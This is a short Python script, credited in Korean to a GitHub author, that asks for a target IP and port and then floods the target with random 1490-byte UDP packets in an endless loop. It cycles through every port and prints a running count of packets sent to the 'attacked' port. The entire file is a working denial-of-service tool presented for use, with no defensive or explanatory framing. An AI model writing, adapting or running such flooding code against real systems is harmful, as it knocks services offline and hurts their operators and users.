import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')

print("제작   : 포렌식 요정")
print("티스토리 :https://github.com/Han-seungjae")

ip = input("타겟 IP : ")
port = int(input("포트       : "))
sent = 0

while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print("총 %s 만큼 패킷을 보냄, 대상 IP: %s 공격중인 포트:%s"%(sent,ip,port))
    if port == 65534:
        port = 1